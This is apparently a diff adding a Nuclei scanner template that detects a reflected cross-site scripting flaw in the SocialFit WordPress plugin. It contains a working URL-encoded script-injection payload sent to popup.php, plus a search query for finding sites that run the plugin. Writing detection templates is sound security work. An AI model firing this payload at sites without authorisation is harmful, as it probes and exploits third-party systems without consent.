@@ -1,0 +1,47 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - </script><script>alert(document.domain)</script>
+        - condition: or
+          part: body
+          type: word
+          words:
+            - <title>Google+
+            - window.___gcfg
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+id: wp-socialfit-xss
+info:
+    author: daffainfo
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+        cvss-score: 7.2
+        cwe-id: CWE-79
+    description: |
+        WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input.
+    metadata:
+        max-request: 1
+        publicwww-query: /wp-content/plugins/socialfit
+        verified: true
+    name: WordPress SocialFit - Cross-Site Scripting
+    reference:
+        - https://www.exploit-db.com/exploits/37481
+    severity: high
+    tags:
+        - wordpress
+        - wp
+        - wp-plugin
+        - edb
+        - WordPress
+        - Perl
